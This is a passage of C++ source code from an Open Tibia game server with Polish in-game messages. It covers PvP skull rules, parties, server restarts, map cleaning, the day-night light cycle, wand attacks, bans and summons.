            player->sendTextMessage(MSG_SMALLINFO, "Nie masz wystraczajacej ilosci many.");
        }
        else if(player->isRookie())
        {
            player->sendMagicEffect(player->pos, NM_ME_PUFF);
            player->sendTextMessage(MSG_SMALLINFO, "Przykro mi, nie posiadasz odpowiedniej profesji.");
        }
        else if (player->maglevel < 0)
        {
            player->sendMagicEffect(player->pos, NM_ME_PUFF);
            player->sendTextMessage(MSG_SMALLINFO, "Nie posiadasz wymaganego mlvl.");
        }
        else if (player->exhaustedTicks >= 1000 && player->access < g_config.ACCESS_PROTECT)
        {
            player->sendMagicEffect(player->pos, NM_ME_PUFF);
            player->sendTextMessage(MSG_SMALLINFO, "You are exhausted.");
        }
        else
        {
            teleport(player, Position(player->pos.x, player->pos.y+1, player->pos.z-1));
            player->sendMagicEffect(player->pos, NM_ME_ENERGY_AREA);

            if (player->access < g_config.ACCESS_PROTECT)
            {
                player->mana -= REQ_MANA;
                player->addManaSpent(REQ_MANA);
            }
        }
    }
}


#ifdef TRS_GM_INVISIBLE
void Game::creatureBroadcastTileUpdated(const Position& pos)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::creatureBroadcastTileUpdated()");
    SpectatorVec list;
    SpectatorVec::iterator it;
    getSpectators(Range(pos, true), list);

    //players
    for(it = list.begin(); it != list.end(); ++it)
    {
        if(dynamic_cast<Player*>(*it))
        {
            (*it)->onTileUpdated(pos);
        }
    }

    //none-players
    for(it = list.begin(); it != list.end(); ++it)
    {
        if(!dynamic_cast<Player*>(*it))
        {
            (*it)->onTileUpdated(pos);
        }
    }
}
#endif //TRS_GM_INVISIBLE


#ifdef HUCZU_SKULLS
void Game::Skull(Player* player)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::Skull()");
    if (player)
    {
        SpectatorVec list;
        SpectatorVec::iterator it;
        getSpectators(Range(player->pos, true), list);

        for(it = list.begin(); it != list.end(); ++it)
        {
            Player* spectator = dynamic_cast<Player*>(*it);
            if(spectator)
                if(player->skullType == SKULL_NONE ||
                        player->skullType == SKULL_WHITE ||
                        player->skullType == SKULL_RED ||
                        player->skullType == SKULL_YELLOW && player->isYellowTo(spectator) ||
                        player->skullType == SKULL_YELLOW && !player->isYellowTo(spectator))
                    spectator->onSkull(player);
        }
    }
}

void Game::onPvP(Creature* creature, Creature* attacked, bool murder)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::onPvP()");

    Player* player = dynamic_cast<Player*>(creature);
    Player* attackedPlayer = dynamic_cast<Player*>(attacked);

    if (player == attackedPlayer)
        return;
    if(!player || !attackedPlayer)
        return;
    if (player && player->access >= g_config.ACCESS_PROTECT || attackedPlayer && attackedPlayer->access >= g_config.ACCESS_PROTECT)
        return;
    if (player->party != 0 && attackedPlayer->party != 0 && player->party == attackedPlayer->party)
        return;

    player->pzLocked = true;
    if (!murder)
    {
        if(!player->hasAttacked(attackedPlayer))
        {
            player->attackedSet;
        }

        if(attackedPlayer->skullType == SKULL_NONE || attackedPlayer->skullType == SKULL_YELLOW && attackedPlayer->isYellowTo(player) == 0)
        {
            if(player->skullType != SKULL_RED && player->skullType != SKULL_WHITE)
            {
                player->skullType = SKULL_WHITE;
                Skull(player);
            }
        }
        else if(attackedPlayer->skullType == SKULL_WHITE || attackedPlayer->skullType == SKULL_RED)
        {
            if(player->skullType != SKULL_RED && player->skullType != SKULL_WHITE)
            {
                if(!attackedPlayer->hasAttacked(player))
                {
                    player->skullType = SKULL_YELLOW;
                    attackedPlayer->hasAsYellow.push_back(player);
                    attackedPlayer->onSkull(player);
                }
            }
        }
        if(player->inFightTicks < (int32_t)g_config.PZ_LOCKED)
            player->inFightTicks = (int32_t)g_config.PZ_LOCKED;
        if(player->skullTicks < (int32_t)g_config.PZ_LOCKED)
            player->skullTicks = (int32_t)g_config.PZ_LOCKED;
    }
    else	// zaatakowany zginal
    {
        if (attackedPlayer->skullType == SKULL_NONE || (attackedPlayer->skullType == SKULL_YELLOW && !player->isYellowTo(attackedPlayer))) //Ofiara nie miala skulla oraz miala yellow ale nie na graczu ktora go zabil.
        {
            player->skullKills++;
            std::string justice(std::string("Warning! The murder of ") + attackedPlayer->getName() + " was not justified!");
            player->sendTextMessage(MSG_RED_INFO, justice.c_str());
#ifdef HUCZU_BAN_SYSTEM
            if (player->skullKills >= g_config.BAN_UNJUST)
            {
                banPlayer(player, "Przekroczono limit zabijania graczy", "AccountBan", "2", 0);
            }
            else
#endif //HUCZU_BAN_SYSTEM
                if (player->skullKills >= g_config.RED_UNJUST)
                {
                    player->skullType = SKULL_RED;
                    if(player->skullTicks < g_config.RED_TIME)
                        player->skullTicks = g_config.RED_TIME;
                    if(player->inFightTicks < g_config.WHITE_TIME)
                        player->inFightTicks = g_config.WHITE_TIME;
                    Skull(player);
                }
                else
                {
                    player->skullType = SKULL_WHITE;
                    if(player->skullTicks < g_config.WHITE_TIME)
                        player->skullTicks = g_config.WHITE_TIME;
                    if(player->inFightTicks < g_config.WHITE_TIME)
                        player->inFightTicks = g_config.WHITE_TIME;
                    Skull(player);
                }
        }
        else if (attackedPlayer->skullType == SKULL_RED)//victim had red skull..(fair kill)
        {
            //we aren't removin his skull..are we?
            attackedPlayer->skullType = SKULL_RED;
            if(player->inFightTicks < g_config.WHITE_TIME)
                player->inFightTicks = g_config.WHITE_TIME;//not giving him a skull.. just setting the murder time.
        }
        else if (attackedPlayer->skullType == SKULL_WHITE) //victim had white skull.. (fair kill)
        {
            attackedPlayer->skullType = SKULL_NONE;
            attackedPlayer->skullTicks = 0;
            attackedPlayer->inFightTicks = 0;
            Skull(attackedPlayer);
            if(player->inFightTicks < g_config.WHITE_TIME)
                player->inFightTicks = g_config.WHITE_TIME;//not giving him a skull.. just setting the murder time.
        }
        else if (attackedPlayer->skullType == SKULL_YELLOW && attackedPlayer->isYellowTo(player))//el que murio era yellow skull para el que lo mato.
        {
            attackedPlayer->skullType = SKULL_NONE;
            attackedPlayer->skullTicks = 0;
            attackedPlayer->inFightTicks = 0;
            Skull(attackedPlayer);
            if(player->inFightTicks < g_config.WHITE_TIME)
                player->inFightTicks = g_config.WHITE_TIME;//not giving him a skull.. just setting the murder time.
        }
        attackedPlayer->clearAttacked();//czyszczenie listy zaatakowanych
        player->removeFromYellowList(attackedPlayer);//usuwanie gracza z Yellow skull z listy atakowanych z ys
        attackedPlayer->removeFromYellowList(player);
    }
}

void Game::LeaveParty(Player *player)
{
    int32_t members = 0;
    std::stringstream bericht1;
    bericht1 << player->getName() << " has left the party";
    if(player->getID() == player->party)
    {
        disbandParty(player->party);
        return;
    }
    for(AutoList<Player>::listiterator it = Player::listPlayer.list.begin(); it != Player::listPlayer.list.end(); ++it)
    {
        if((*it).second->party == player->party)
        {
            members++;
            if((*it).second->getID() != player->getID())
                (*it).second->sendTextMessage(MSG_INFO, bericht1.str().c_str());
            (*it).second->onPartyIcons(player, 0, false, true);
            player->onPartyIcons((*it).second, 0, false, true);
        }
    }
    if(members <= 2)
    {
        disbandParty(player->party);
        return;
    }
    player->sendTextMessage(MSG_INFO, "You have left the party.");
    player->party = 0;
}

void Game::disbandParty(uint32_t partyID)
{
    for(AutoList<Player>::listiterator cit = Player::listPlayer.list.begin(); cit != Player::listPlayer.list.end(); ++cit)
    {
        if((*cit).second->party == partyID)
        {
            (*cit).second->party = 0;
            for(AutoList<Player>::listiterator it = Player::listPlayer.list.begin(); it != Player::listPlayer.list.end(); ++it)
            {
                (*cit).second->onPartyIcons((*it).second, 0, false, true);
                if((*it).second->skullType == SKULL_NONE ||
                        (*it).second->skullType == SKULL_WHITE ||
                        (*it).second->skullType == SKULL_RED ||
                        (*it).second->skullType == SKULL_YELLOW &&
                        (*it).second->isYellowTo((*cit).second))
                    (*cit).second->onSkull((*it).second);
            }
            (*cit).second->sendTextMessage(MSG_INFO, "Your party has been disbanded.");
        }
    }
}
void Game::checkSkullTime(Player* player)
{
    if(player->skullType == SKULL_NONE)//just in case
        return;

    if(player->skullTicks < player->inFightTicks)
        player->skullTicks = player->inFightTicks;

    if(player->skullType != SKULL_RED && player->skullTicks > player->inFightTicks) //we don't want to do that if the player has a red skull...
        player->inFightTicks = player->skullTicks;

}
#endif //HUCZU_SKULLS

class MagicEffectAreaNoExhaustionClass: public MagicEffectAreaClass
{
public:
    bool causeExhaustion(bool hasTarget) const
    {
        return false;
    }
};

void Game::burstArrow(Creature* c, const Position& pos)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::burstArrow()");
    std::vector<unsigned char> col;
    MagicEffectAreaNoExhaustionClass runeAreaSpell;

    runeAreaSpell.attackType = ATTACK_PHYSICAL;
    runeAreaSpell.animationEffect = NM_ANI_BURSTARROW;
    runeAreaSpell.hitEffect = NM_ME_EXPLOSION_DAMAGE;
    runeAreaSpell.areaEffect = NM_ME_EXPLOSION_AREA;
    runeAreaSpell.animationColor = 198; //DAMAGE_FIRE;
    runeAreaSpell.drawblood = true;
    runeAreaSpell.offensive = true;

    /* Area of Spell */
    col.push_back(1);
    col.push_back(1);
    col.push_back(1);
    runeAreaSpell.areaVec.push_back(col);
    col.clear();
    col.push_back(1);
    col.push_back(1);
    col.push_back(1);
    runeAreaSpell.areaVec.push_back(col);
    col.clear();
    col.push_back(1);
    col.push_back(1);
    col.push_back(1);
    runeAreaSpell.areaVec.push_back(col);

    /* hard no ? */
    runeAreaSpell.direction = 1;
    runeAreaSpell.minDamage = int32_t(((c->level*g_config.BURST_DMG_LVL)+(c->maglevel*g_config.BURST_DMG_MLVL))*g_config.BURST_DMG_LO);
    runeAreaSpell.maxDamage = int32_t(((c->level*g_config.BURST_DMG_LVL)+(c->maglevel*g_config.BURST_DMG_MLVL))*g_config.BURST_DMG_HI);
    creatureThrowRune(c, pos, runeAreaSpell);
}

void Game::beforeRestart()
{
    sheduleShutdown(5);
}

void Game::sheduleShutdown(int32_t minutes)
{
    if (minutes > 0)
        checkShutdown(minutes);
}

void Game::checkShutdown(int32_t minutes)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::checkShutdown()");
    if (minutes == 0)
    {
        serverSave();
        setGameState(GAME_STATE_CLOSED);
        while (!Player::listPlayer.list.empty())
            Player::listPlayer.list.begin()->second->kickPlayer();

        std::cout << ":: Restart serwera." << std::endl;
        OTSYS_SLEEP(500);
        exit(1);
    }
    else
    {
        std::stringstream msg;
        if (minutes == 5)
            msg << "Uwaga! Restart serwera. Restart potrwa kilkadziesiat sekund." << std::endl;
        else if (minutes == 1)
            msg << "Serwer zostanie wylaczony za " << minutes << " minute. Prosze sie zalogowac po przerwie." << std::ends;
        else
            msg << "Serwer zostanie wylaczony za " << minutes << (minutes>4? " minut." : " minuty.") << std::ends;

        AutoList<Player>::listiterator it = Player::listPlayer.list.begin();
        while (it != Player::listPlayer.list.end())
        {
            (*it).second->sendTextMessage(MSG_RED_INFO, msg.str().c_str());
            ++it;
        }

        addEvent(makeTask(60000, boost::bind(&Game::checkShutdown, this, minutes - 1)));
    }
}

void Game::setMaxPlayers(uint32_t newmax)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::setMaxPlayers()");
    max_players = newmax;
    Status::instance()->playersmax = newmax;
}

int32_t Game::cleanMap()
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::cleanMap()");
    return map->clean();
}

void Game::autocleanMap(int32_t seconds)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::autocleanMap()");
    std::stringstream msg;
    if (seconds == 0)
    {
        std::cout << ":: auto clean... ";
        int32_t count = cleanMap();

        msg << "Clean zakonczono pomyslnie. Skasowano itemow: " << count << "." << std::ends;
        for(AutoList<Player>::listiterator it = Player::listPlayer.list.begin(); it != Player::listPlayer.list.end(); ++it)
        {
            Player* player = (*it).second;
            if(player)
                player->sendTextMessage(MSG_RED_INFO, msg.str().c_str());
        }

        addEvent(makeTask(g_config.AUTO_CLEAN, std::mem_fun(&Game::beforeClean)));
    }
    else
    {
        msg << "Clean za " << seconds << std::ends;
        for(AutoList<Player>::listiterator it = Player::listPlayer.list.begin(); it != Player::listPlayer.list.end(); ++it)
        {
            if(dynamic_cast<Player*>(it->second))
                (*it).second->sendTextMessage(MSG_RED_INFO, msg.str().c_str());
        }

        addEvent(makeTask(1000, boost::bind(&Game::autocleanMap, this, seconds - 1)));
    }
}

void Game::beforeClean()
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::beforeClean()");

    std::stringstream msg;
    msg << "UWAGA! Clean za 2 minuty!" << std::ends;
    for(AutoList<Player>::listiterator it = Player::listPlayer.list.begin(); it != Player::listPlayer.list.end(); ++it)
    {
        if(dynamic_cast<Player*>(it->second))
            (*it).second->sendTextMessage(MSG_RED_INFO, msg.str().c_str());
    }
    addEvent(makeTask(115000, boost::bind(&Game::autocleanMap, this, 5)));
}

#ifdef CVS_DAY_CYCLE
void Game::creatureChangeLight(Player* player, int32_t time, unsigned char lightlevel, unsigned char lightcolor)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::creatureChangeLight()");

    player->setLightLevel(lightlevel, lightcolor);
    SpectatorVec list;
    getSpectators(Range(player->pos), list);

    for (SpectatorVec::iterator iter = list.begin(); iter != list.end(); ++iter)
    {
        Player* spectator = dynamic_cast<Player*>(*iter);
        if (spectator)
            spectator->sendPlayerLightLevel(player);
    }
}

void Game::checkLight(int32_t t)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::checkLight()");
    addEvent(makeTask(10000, boost::bind(&Game::checkLight, this, 10000)));

    light_hour = light_hour + light_hour_delta;
    if(light_hour > 1440)
        light_hour = light_hour - 1440;

    if(std::abs(light_hour - SUNRISE) < 2*light_hour_delta)
    {
        light_state = LIGHT_STATE_SUNRISE;
    }
    else if(std::abs(light_hour - SUNSET) < 2*light_hour_delta)
    {
        light_state = LIGHT_STATE_SUNSET;
    }

    int32_t newlightlevel = lightlevel;
    switch(light_state)
    {
    case LIGHT_STATE_SUNRISE:
        newlightlevel += (LIGHT_LEVEL_DAY - LIGHT_LEVEL_NIGHT)/30;
        break;
    case LIGHT_STATE_SUNSET:
        newlightlevel -= (LIGHT_LEVEL_DAY - LIGHT_LEVEL_NIGHT)/30;
        break;
    }

    if(newlightlevel <= LIGHT_LEVEL_NIGHT)
    {
        lightlevel = LIGHT_LEVEL_NIGHT;
        light_state = LIGHT_STATE_NIGHT;
    }
    else if(newlightlevel >= LIGHT_LEVEL_DAY)
    {
        lightlevel = LIGHT_LEVEL_DAY;
        light_state = LIGHT_STATE_DAY;
    }
    else
    {
        lightlevel = newlightlevel;
    }
}

unsigned char Game::getLightLevel()
{
    return lightlevel;
}
#endif //CVS_DAY_CYCLE

void Game::useWand(Creature *creature, Creature *attackedCreature, int32_t wandid)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::useWand()");

    Player *player = dynamic_cast<Player*>(creature);
    if(!player || !attackedCreature || player->pos.z != attackedCreature->pos.z)
        return;

    int32_t dist, mana = 0;
    MagicEffectAreaNoExhaustionClass runeAreaSpell;
    runeAreaSpell.drawblood = true;
    runeAreaSpell.offensive = true;
    runeAreaSpell.direction = 1;

    if (wandid == ITEM_QUAGMIRE_ROD && player->vocation == VOCATION_DRUID &&
            player->mana >= g_config.MANA_QUAGMIRE && player->getLevel() >= 26)
    {
        dist = g_config.RANGE_QUAGMIRE;
        if (abs(player->pos.x - attackedCreature->pos.x) > dist ||
                abs(player->pos.y - attackedCreature->pos.y) > dist)
            return;

        runeAreaSpell.attackType = ATTACK_POISON;
        runeAreaSpell.animationEffect = NM_ANI_FLYPOISONFIELD;
        runeAreaSpell.hitEffect = NM_ME_POISEN_RINGS;
        runeAreaSpell.areaEffect = NM_ME_POISEN_RINGS;
        runeAreaSpell.animationColor = 0x60;

        runeAreaSpell.minDamage = 40;
        runeAreaSpell.maxDamage = 50;
        mana = g_config.MANA_QUAGMIRE;
    }
    else if (wandid == ITEM_SNAKEBITE_ROD && player->vocation == VOCATION_DRUID &&
             player->mana >= g_config.MANA_SNAKEBITE && player->getLevel() >= 7)
    {
        dist = g_config.RANGE_SNAKEBITE;
        if (abs(player->pos.x - attackedCreature->pos.x) > dist ||
                abs(player->pos.y - attackedCreature->pos.y) > dist)
            return;

        runeAreaSpell.attackType = ATTACK_POISON;
        runeAreaSpell.animationEffect = NM_ANI_FLYPOISONFIELD;
        runeAreaSpell.hitEffect = NM_ME_POISEN_RINGS;
        runeAreaSpell.areaEffect = NM_ME_POISEN_RINGS;
        runeAreaSpell.animationColor = 0x60;

        runeAreaSpell.minDamage = 8;
        runeAreaSpell.maxDamage = 18;
        mana = g_config.MANA_SNAKEBITE;
    }
    else if (wandid == ITEM_TEMPEST_ROD && player->vocation == VOCATION_DRUID &&
             player->mana >= g_config.MANA_TEMPEST && player->getLevel() >= 33)
    {
        dist = g_config.RANGE_TEMPEST;
        if (abs(player->pos.x - attackedCreature->pos.x) > dist ||
                abs(player->pos.y - attackedCreature->pos.y) > dist)
            return;

        runeAreaSpell.attackType = ATTACK_ENERGY;
        runeAreaSpell.animationEffect = NM_ANI_ENERGY;
        runeAreaSpell.hitEffect = NM_ME_ENERGY_DAMAGE;
        runeAreaSpell.areaEffect = NM_ME_ENERGY_AREA;
        runeAreaSpell.animationColor = 0x49;

        runeAreaSpell.minDamage = 60;
        runeAreaSpell.maxDamage = 70;
        mana = g_config.MANA_TEMPEST;
    }
    else if (wandid == ITEM_VOLCANIC_ROD && player->vocation == VOCATION_DRUID &&
             player->mana >= g_config.MANA_VOLCANIC && player->getLevel() >= 19)
    {
        dist = g_config.RANGE_VOLCANIC;
        if (abs(player->pos.x - attackedCreature->pos.x) > dist ||
                abs(player->pos.y - attackedCreature->pos.y) > dist)
            return;

        runeAreaSpell.attackType = ATTACK_FIRE;
        runeAreaSpell.animationEffect = NM_ANI_FIRE;
        runeAreaSpell.hitEffect = NM_ME_FIRE_AREA;
        runeAreaSpell.areaEffect = NM_ME_FIRE_AREA;
        runeAreaSpell.animationColor = 0xC7;

        runeAreaSpell.minDamage = 25;
        runeAreaSpell.maxDamage = 35;
        mana = g_config.MANA_VOLCANIC;
    }
    if (wandid == ITEM_MOONLIGHT_ROD && player->vocation == VOCATION_DRUID &&
            player->mana >= g_config.MANA_MOONLIGHT && player->getLevel() >= 13)
    {
        dist = g_config.RANGE_MOONLIGHT;
        if (abs(player->pos.x - attackedCreature->pos.x) > dist ||
                abs(player->pos.y - attackedCreature->pos.y) > dist)
            return;

        runeAreaSpell.attackType = ATTACK_ENERGY;
        runeAreaSpell.animationEffect = NM_ANI_ENERGY;
        runeAreaSpell.hitEffect = NM_ME_ENERGY_DAMAGE;
        runeAreaSpell.areaEffect = NM_ME_ENERGY_AREA;
        runeAreaSpell.animationColor = 0x47;

        runeAreaSpell.minDamage = 14;
        runeAreaSpell.maxDamage = 24;
        mana = g_config.MANA_MOONLIGHT;
    }
    else if (wandid == ITEM_WAND_OF_INFERNO && player->vocation == VOCATION_SORCERER &&
             player->mana >= g_config.MANA_INFERNO && player->getLevel() >= 33)
    {
        dist = g_config.RANGE_INFERNO;
        if (abs(player->pos.x - attackedCreature->pos.x) > dist ||
                abs(player->pos.y - attackedCreature->pos.y) > dist)
            return;

        runeAreaSpell.attackType = ATTACK_FIRE;
        runeAreaSpell.animationEffect = NM_ANI_FIRE;
        runeAreaSpell.hitEffect = NM_ME_FIRE_AREA;
        runeAreaSpell.areaEffect = NM_ME_FIRE_AREA;
        runeAreaSpell.animationColor = 0xC7;

        runeAreaSpell.minDamage = 60;
        runeAreaSpell.maxDamage = 70;
        mana = g_config.MANA_INFERNO;
    }
    else if (wandid == ITEM_WAND_OF_PLAGUE && player->vocation == VOCATION_SORCERER &&
             player->mana >= g_config.MANA_PLAGUE && player->getLevel() >= 19)
    {
        dist = g_config.RANGE_PLAGUE;
        if (abs(player->pos.x - attackedCreature->pos.x) > dist ||
                abs(player->pos.y - attackedCreature->pos.y) > dist)
            return;

        runeAreaSpell.attackType = ATTACK_POISON;
        runeAreaSpell.animationEffect = NM_ANI_FLYPOISONFIELD;
        runeAreaSpell.hitEffect = NM_ME_POISEN_RINGS;
        runeAreaSpell.areaEffect = NM_ME_POISEN_RINGS;
        runeAreaSpell.animationColor = 0x60;

        runeAreaSpell.minDamage = 25;
        runeAreaSpell.maxDamage = 35;
        mana = g_config.MANA_PLAGUE;
    }
    else if (wandid == ITEM_WAND_OF_COSMIC_ENERGY && player->vocation == VOCATION_SORCERER &&
             player->mana >= g_config.MANA_COSMIC && player->getLevel() >= 26)
    {
        dist = g_config.RANGE_COSMIC;
        if (abs(player->pos.x - attackedCreature->pos.x) > dist ||
                abs(player->pos.y - attackedCreature->pos.y) > dist)
            return;

        runeAreaSpell.attackType = ATTACK_ENERGY;
        runeAreaSpell.animationEffect = NM_ANI_ENERGY;
        runeAreaSpell.hitEffect = NM_ME_ENERGY_DAMAGE;
        runeAreaSpell.areaEffect = NM_ME_ENERGY_AREA;
        runeAreaSpell.animationColor = 0x47;

        runeAreaSpell.minDamage = 40;
        runeAreaSpell.maxDamage = 50;
        mana = g_config.MANA_COSMIC;
    }
    else if (wandid == ITEM_WAND_OF_VORTEX && player->vocation == VOCATION_SORCERER &&
             player->mana >= g_config.MANA_VORTEX && player->getLevel() >= 7)
    {
        dist = g_config.RANGE_VORTEX;
        if (abs(player->pos.x - attackedCreature->pos.x) > dist ||
                abs(player->pos.y - attackedCreature->pos.y) > dist)
            return;

        runeAreaSpell.attackType = ATTACK_ENERGY;
        runeAreaSpell.animationEffect = NM_ANI_ENERGY;
        runeAreaSpell.hitEffect = NM_ME_ENERGY_DAMAGE;
        runeAreaSpell.areaEffect = NM_ME_ENERGY_AREA;
        runeAreaSpell.animationColor = 0x47;

        runeAreaSpell.minDamage = 8;
        runeAreaSpell.maxDamage = 18;
        mana = g_config.MANA_VORTEX;
    }
    else if (wandid == ITEM_WAND_OF_DRAGONBREATH && player->vocation == VOCATION_SORCERER &&
             player->mana >= g_config.MANA_DRAGONBREATH && player->getLevel() >= 13)
    {
        dist = g_config.RANGE_DRAGONBREATH;
        if (abs(player->pos.x - attackedCreature->pos.x) > dist ||
                abs(player->pos.y - attackedCreature->pos.y) > dist)
            return;

        runeAreaSpell.attackType = ATTACK_FIRE;
        runeAreaSpell.animationEffect = NM_ANI_FIRE;
        runeAreaSpell.hitEffect = NM_ME_FIRE_AREA;
        runeAreaSpell.areaEffect = NM_ME_FIRE_AREA;
        runeAreaSpell.animationColor = 0xC7;

        runeAreaSpell.minDamage = 14;
        runeAreaSpell.maxDamage = 24;
        mana = g_config.MANA_DRAGONBREATH;
    }

    if (mana > 0)
    {
        std::vector<unsigned char> col;

        col.push_back(0);
        col.push_back(0);
        col.push_back(0);
        runeAreaSpell.areaVec.push_back(col);
        col.clear();
        col.push_back(0);
        col.push_back(1);
        col.push_back(0);
        runeAreaSpell.areaVec.push_back(col);
        col.clear();
        col.push_back(0);
        col.push_back(0);
        col.push_back(0);
        runeAreaSpell.areaVec.push_back(col);

        creatureThrowRune(player, attackedCreature->pos, runeAreaSpell);
        player->addManaSpent(mana);
        player->mana -= mana;
    }
}

#ifdef HUCZU_BAN_SYSTEM
void Game::banPlayer(Player *player, std::string reason, std::string action, std::string comment, unsigned char IPban)
{
    int32_t bantime = 0;
    if(player)
    {
        if(action == "BanNaDni")
            bantime = atoi(comment.c_str()) * 86400; // ban na dni : )

        if(action != "BanNaDni")
            bantime = atoi(comment.c_str()) * 3600/*86400*/; //ban na godziny ;)

        if(player->finalwarning == 1)
            player->deleted = 1;

        if(action == "Namelock/AccountBan+FinalWarning")
        {
            player->namelock = 1;
            player->finalwarning = 1;
        }
        if(action == "AccountBan+FinalWarning")
            player->finalwarning = 1;

        if(action == "Namelock")
            player->namelock = 1;

        if(reason == "Przekroczono limit zabijania graczy")
            bantime = g_config.PK_BANDAYS;

        player->banned = 1;
        player->comment = comment;
        player->reason = reason;
        player->action = action;
#ifdef USING_VISUAL_2005
        player->banstart = _time32(NULL);
#else
        player->banstart = std::time(NULL);
#endif
        player->banend = player->banstart + bantime;
        time_t endBan = player->banend;
        player->banrealtime = ctime(&endBan);
        if(IPban != 0)
        {
            std::pair<uint32_t, uint32_t> IpNetMask;
            IpNetMask.first = player->lastip;
            IpNetMask.second = 0xFFFFFFFF;
            if(IpNetMask.first > 0)
                bannedIPs.push_back(IpNetMask);
        }
        std::stringstream ban;
        ban << "Zostales zbanowany za " << reason << "!";
        player->sendTextMessage(MSG_INFO, ban.str().c_str());
        player->kickPlayer();
    }
}
#endif //HUCZU_BAN_SYSTEM

void Game::CreateCondition(Creature* creature, Creature* target, unsigned char animationColor, unsigned char damageEffect, unsigned char hitEffect, attacktype_t attackType, bool offensive, int32_t maxDamage, int32_t minDamage, int32_t ticks, int32_t count)
{
    uint32_t targetID;
    if(target)
        targetID = target->getID();
    else
        targetID = 0;

    MagicEffectTargetCreatureCondition magicCondition = MagicEffectTargetCreatureCondition(targetID);
    magicCondition.animationColor = animationColor;
    magicCondition.damageEffect = damageEffect;
    magicCondition.hitEffect = hitEffect;
    magicCondition.attackType = attackType;
    magicCondition.maxDamage = maxDamage;
    magicCondition.minDamage = minDamage;
    magicCondition.offensive = offensive;
    CreatureCondition condition = CreatureCondition(ticks, count, magicCondition);
    creature->addCondition(condition, true);
    Player *player = dynamic_cast<Player*>(creature);
    if(player)
        player->sendIcons();
}

void Game::doFieldDamage(Creature* creature, unsigned char animationColor, unsigned char damageEffect,
                         unsigned char hitEffect, attacktype_t attackType, bool offensive, int32_t damage)
{
    MagicEffectClass cd;
    cd.animationColor = animationColor;
    cd.damageEffect = damageEffect;
    cd.hitEffect = hitEffect;
    cd.attackType = attackType;
    cd.offensive = offensive;
    Player* itsHim = dynamic_cast<Player*>(getCreatureByID(creature->getID()));
    if(itsHim)  //Since that was causing damage/2 against player, here its my solution =)
    {
        cd.maxDamage = damage*2;
        cd.minDamage = damage*2;
    }
    else
    {
        cd.maxDamage = damage;
        cd.minDamage = damage;
    }
    creatureMakeMagic(NULL, creature->pos, &cd);
}

void Game::updateTile(const Position& pos)
{
    SpectatorVec list;
    SpectatorVec::iterator i;
    getSpectators(Range(pos), list);
    for(i = list.begin(); i != list.end(); ++i)
        (*i)->onTileUpdated(pos);
}

bool Game::loadReadables()
{
    std::string file = g_config.DATA_DIR + "readables.xml";
    xmlDocPtr doc;

    doc = xmlParseFile(file.c_str());
    if (!doc)
        return false;

    xmlNodePtr root, readableNode;
    root = xmlDocGetRootElement(doc);
    if (xmlStrcmp(root->name, (const xmlChar*)"readables"))
    {
        xmlFreeDoc(doc);
        return false;
    }

    readableNode = root->children;
    while (readableNode)
    {
        if (strcmp((char*) readableNode->name, "readable") == 0)
        {
            int32_t x = atoi((const char*)xmlGetProp(readableNode, (const xmlChar *) "x"));
            int32_t y = atoi((const char*)xmlGetProp(readableNode, (const xmlChar *) "y"));
            int32_t z = atoi((const char*)xmlGetProp(readableNode, (const xmlChar *) "z"));
            std::string text = (const char*)xmlGetProp(readableNode, (const xmlChar *) "text");

            for (size_t i = 0; i < text.length()-1; i++)	// make real newlines
                if (text.at(i) == '\\' && text.at(i+1) == 'n')
                {
                    text[i] = ' ';
                    text[i+1] = '\n';
                }

            Tile* tile = getTile(x, y, z);
            if (tile)
            {
                Thing* thing = tile->getTopThing();
                Item* item = thing? dynamic_cast<Item*>(thing) : NULL;

                if (item)
                    item->setReadable(text);
                else
                {
                    std::cout << "\nTop thing at " << Position(x,y,z) << " is not an item!";
                    return false;
                }
            }
            else
            {
                std::cout << "\nTile " << Position(x,y,z) << " is not valid!";
                return false;
            }
        }
        readableNode = readableNode->next;
    }

    xmlFreeDoc(doc);
    return true;
}

#ifdef __MIZIAK_SUPERMANAS__
void Game::fullManas(Item* item, Player* player, const Position& posFrom, const unsigned char stack_from)
{
    if(!player || !item)
        return;

    item->setItemCountOrSubtype(5);
    if(posFrom.x == 0xFFFF)
    {
        this->sendUpdateThing(player,posFrom,item,stack_from);
        Item* old_item = player->getItemByID(2006,0, true);
        if(old_item != NULL)
        {
            old_item->setItemCountOrSubtype(5);
            this->sendUpdateThing(player,posFrom,old_item,stack_from);
        }
    }
}

void Game::sendMagicEffectToSpectors(Position& pos, int32_t efekt)
{
    SpectatorVec list;
    this->getSpectators(Range(pos, true), list);

    for(SpectatorVec::iterator it = list.begin(); it != list.end(); ++it)
    {
        Player *p = dynamic_cast<Player*>(*it);
        if(p)
            p->sendMagicEffect(pos, efekt);
    }
}
#endif //__MIZIAK_SUPERMANAS__

#ifdef TR_SUMMONS
bool Game::placeSummon(Player* p, const std::string& name)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::placeSummon()");
    Monster* monster = Monster::createMonster(name, this);

    if(!monster)
        return false;

    Position pos = p->pos;
    switch (p->direction)
    {
    case NORTH:
        pos.y--;
        break;
    case SOUTH:
        pos.y++;
        break;
    case EAST:
        pos.x++;
        break;
    case WEST:
        pos.x--;
        break;
    }

    Tile* tile = getTile(pos);
#ifdef YUR_PVP_ARENA
    if (!tile || tile->isPz() || tile->isPvpArena() || !placeCreature(pos, monster))
#else
    if (!tile || tile->isPz() || !placeCreature(pos, monster))
#endif //YUR_PVP_ARENA
    {
        delete monster;
        return false;
    }
    else
    {
        p->addSummon(monster);
        return true;
    }
}
#endif //TR_SUMMONS
/*void Game::addBan(Player* player, Player* bannedPlayer, std::string reason, std::string action, std::string comment, unsigned char IPBan)
{
    std::string filename = g_config.DATA_DIR + "bans.xml";
    char buf[20];
    time_t ticks = time(0);
#ifdef USING_VISUAL_2005
		tm now;
		localtime_s(&now, &ticks);
